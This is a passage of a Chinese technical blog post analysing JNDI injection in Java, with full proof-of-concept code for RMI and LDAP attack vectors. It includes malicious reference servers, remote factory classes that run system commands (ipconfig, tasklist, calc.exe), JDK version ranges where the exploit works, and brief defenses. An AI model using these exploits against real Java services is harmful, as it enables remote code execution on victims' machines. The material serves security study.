<p>这里将RMIService.java和JNDIClient.java放在同一目录下，将EvilObject.java放在另一个目录下（为防止漏洞复现过程中应用端实例化EvilObject对象时从CLASSPATH当前路径找到编译好的字节代码，而不去远端进行下载的情况发生）,编译这三个文件，并在不同窗口下执行命令，最后成功通过RMI+Reference的方式实现JNDI注入：</p>
<p><img src="/2019/09/15/浅析JNDI注入/7.png" alt=""></p>
<h4 id="漏洞点1——lookup参数注入"><a href="#漏洞点1——lookup参数注入" class="headerlink" title="漏洞点1——lookup参数注入"></a>漏洞点1——lookup参数注入</h4><p>当JNDI客户端的lookup()函数的参数可控即URI可控时，根据JNDI协议动态转换的原理，攻击者可以传入恶意URI地址指向攻击者的RMI注册表服务，以使受害者客户端加载绑定在攻击者RMI注册表服务上的恶意类，从而实现远程代码执行。</p>
<p>下面以RMI服务为例，原理和上一个小结讲的是一样的，本地JDK版本为1.8.0_73。</p>
<p>AClient.java，是JNDI客户端，原本上下文环境已经设置了默认连接本地的1099端口的RMI注册表服务，同时程序允许用户输入URI地址来动态转换JNDI的访问地址，即此处lookup()函数的参数可控：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(args.length == <span class="number">1</span>) &#123;</span><br><span class="line">            uri = args[<span class="number">0</span>];</span><br><span class="line">            System.out.println(<span class="string">"[*]Using lookup() to fetch object with "</span> + uri);</span><br><span class="line">            ctx.lookup(uri);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo"</span>);</span><br><span class="line">            ctx.lookup(<span class="string">"demo"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>AServer.java，是攻击者搭建的恶意RMI注册表服务而非原本正常的本地RMI注册表服务（做漏洞演示就没必要写正常的服务端那部分了），其将恶意Reference类绑定到RMI注册表中，用于给JNDI客户端加载并执行恶意代码（注意这里的Reference类初始化时其第三个参数即factoryLocation参数随意设置了一个内容，将该恶意类放在与当前RMI注册表服务同一目录中，当然也可以修改该参数为某个URI去加载，但是需要注意的是URL不用指定到特定的class、只需给出该class所在的URL路径即可）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1688</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilClass"</span>, <span class="string">"EvilClassFactory"</span>, <span class="string">"test"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"[*]Binding 'exp' to 'rmi://127.0.0.1:1688/exp'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"exp"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后编写恶意EvilClassFactory类，目标是在客户端执行ipconfig命令，将其编译成class文件后与AServer放置于同一目录下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClassFactory</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClassFactory</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        InputStream inputStream;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inputStream = Runtime.getRuntime().exec(<span class="string">"ipconfig"</span>).getInputStream();</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">            BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(bufferedInputStream));</span><br><span class="line">            String linestr;</span><br><span class="line">            <span class="keyword">while</span> ((linestr = bufferedReader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(linestr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>模拟场景，攻击者开启恶意RMI注册表服务AServer，同时恶意类EvilClassFactory放置在同一环境中，由于JNDI客户端的lookup()函数参数可控，因为当客户端输入指向AServer的URI进行lookup操作时就会触发JNDI注入漏洞，导致远程代码执行。效果如图：</p>
<p><img src="/2019/09/15/浅析JNDI注入/5.png" alt=""></p>
<p>最后小结一下，调用InitialContext.lookup()函数都有哪些类。</p>
<p>在RMI中调用了InitialContext.lookup()的类有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.transaction.jta.JtaTransactionManager.readObject()</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl.execute()</span><br><span class="line">javax.management.remote.rmi.RMIConnector.connect()</span><br><span class="line">org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</span><br></pre></td></tr></table></figure>
<p>在LDAP中调用了InitialContext.lookup()的类有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InitialDirContext.lookup()</span><br><span class="line">Spring&apos;s LdapTemplate.lookup()</span><br><span class="line">LdapTemplate.lookupContext()</span><br></pre></td></tr></table></figure>
<h4 id="漏洞点2——classFactoryLocation参数注入"><a href="#漏洞点2——classFactoryLocation参数注入" class="headerlink" title="漏洞点2——classFactoryLocation参数注入"></a>漏洞点2——classFactoryLocation参数注入</h4><p>前面lookup()参数注入是基于RMI客户端的，也是最常见的。而本小节的classFactoryLocation参数注入则是对于RMI服务端而言的，也就是说服务端程序在调用Reference()初始化参数时，其中的classFactoryLocation参数外部可控，导致存在JNDI注入。</p>
<p>整个利用原理过程如图：</p>
<p><img src="/2019/09/15/浅析JNDI注入/10.png" alt=""></p>
<p>BClient.java，RMI客户端，通过JNDI来查询RMI注册表上绑定的demo对象，其中lookup()函数参数不可控：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        System.out.println(<span class="string">"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo"</span>);</span><br><span class="line">        ctx.lookup(<span class="string">"demo"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>BServer.java，RMI服务端，创建RMI注册表并将一个远程类的引用绑定在注册表中名为demo，其中该Reference的classFactoryLocation参数外部可控：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(args.length == <span class="number">1</span>) &#123;</span><br><span class="line">            uri = args[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            uri = <span class="string">"http://127.0.0.1/demo.class"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[*]classFactoryLocation: "</span> + uri);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilClass"</span>, <span class="string">"EvilClassFactory"</span>, uri);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"[*]Binding 'demo' to 'rmi://192.168.43.201:1099/demo'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"demo"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>EvilClassFactory.java，攻击者编写的远程恶意类，这里是在RMI客户端执行tasklist命令并输出出来：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClassFactory</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClassFactory</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        InputStream inputStream;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inputStream = Runtime.getRuntime().exec(<span class="string">"tasklist"</span>).getInputStream();</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">            BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(bufferedInputStream));</span><br><span class="line">            String linestr;</span><br><span class="line">            <span class="keyword">while</span> ((linestr = bufferedReader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(linestr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>攻击者将恶意类EvilClassFactory.class放置在自己的Web服务器后，通过往RMI注册表服务端的classFactoryLocation参数输入攻击者的Web服务器地址后，当受害者的RMI客户端通过JNDI来查询RMI注册表中年绑定的demo对象时，会找到classFactoryLocation参数被修改的Reference对象，再远程加载攻击者服务器上的恶意类EvilClassFactory.class，从而导致JNDI注入、实现远程代码执行：</p>
<p><img src="/2019/09/15/浅析JNDI注入/9.png" alt=""></p>
<h4 id="漏洞点3——RMI恶意远程对象"><a href="#漏洞点3——RMI恶意远程对象" class="headerlink" title="漏洞点3——RMI恶意远程对象"></a>漏洞点3——RMI恶意远程对象</h4><blockquote>
<p>攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP/FTP/SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载，RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下：</p>
<ol>
<li>RMI客户端的上下文环境允许访问远程Codebase。</li>
<li>属性 java.rmi.server.useCodebaseOnly 的值必需为false。</li>
</ol>
<p>然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
<p>Changelog:</p>
<ul>
<li>JDK 6u45 <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html</a></li>
<li>JDK 7u21 <a href="http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li>
</ul>
</blockquote>
<p>这种方法限制很多，不常使用，这里先搞Demo了，意义不大。</p>
<h4 id="漏洞点4——结合反序列化漏洞"><a href="#漏洞点4——结合反序列化漏洞" class="headerlink" title="漏洞点4——结合反序列化漏洞"></a>漏洞点4——结合反序列化漏洞</h4><p>这种情形其实就是漏洞类重写的readObject()方法中直接或间接调用了可被外部控制的lookup()方法，导致攻击者可以通过JNDI注入来进行反序列化漏洞的利用。</p>
<p>具体的例子如Spring Framework的反序列化漏洞，原理和示例看之前的文章就OK了：<a href="https://www.mi1k7ea.com/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">《由JNDI注入引发的Spring Framework反序列化漏洞》</a></p>
<h3 id="LDAP攻击向量"><a href="#LDAP攻击向量" class="headerlink" title="LDAP攻击向量"></a>LDAP攻击向量</h3><p>通过LDAP攻击向量来利用JNDI注入的原理和RMI攻击向量是一样的，区别只是换了个媒介而已，下面就只列下LDAP+Reference的利用技巧，至于JNDI注入漏洞点和前面是一样的就不再赘述了。</p>
<h4 id="LDAP-Reference利用技巧"><a href="#LDAP-Reference利用技巧" class="headerlink" title="LDAP+Reference利用技巧"></a>LDAP+Reference利用技巧</h4><p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如<code>ldap://xxx/xxx</code>，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p>
<p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p>
<p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p>
<p>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。下面的示例代码中我本地的JDk版本是1.8.0_73。</p>
<p>LdapServer.java，LDAP服务，需要导入unboundid-ldapsdk.jar包：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8000/#EvilObject"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>LdapClient.java，LDAP客户端：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx.lookup(<span class="string">"ldap://localhost:1234/EvilObject"</span>);</span><br><span class="line">            String data = <span class="string">"This is LDAP Client."</span>;</span><br><span class="line">            <span class="comment">//System.out.println(serv.service(data));</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>EvilObject.java，恶意类，执行弹出计算器：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="/2019/09/15/浅析JNDI注入/8.png" alt=""></p>
<h3 id="CORBA攻击向量"><a href="#CORBA攻击向量" class="headerlink" title="CORBA攻击向量"></a>CORBA攻击向量</h3><p>利用CORBA攻击向量进行JNDI注入的原理和RMI、LDAP是类似的，限于个人知识的匮乏，暂时写不了这章。 : (</p>
<h2 id="0x03-绕过高版本JDK限制"><a href="#0x03-绕过高版本JDK限制" class="headerlink" title="0x03 绕过高版本JDK限制"></a>0x03 绕过高版本JDK限制</h2><p>…</p>
<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><ul>
<li>使用最新的JDK版本；</li>
<li>将外部数据传入InitialContext.lookup()方法前先进行严格的过滤；</li>
<li>使用安全管理器时，需要仔细审计安全策略；</li>
</ul>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://blog.csdn.net/u011721501/article/details/52316225" target="_blank" rel="noopener">BlackHat2016——JDNI注入/LDAP Entry污染攻击技术研究</a></p>
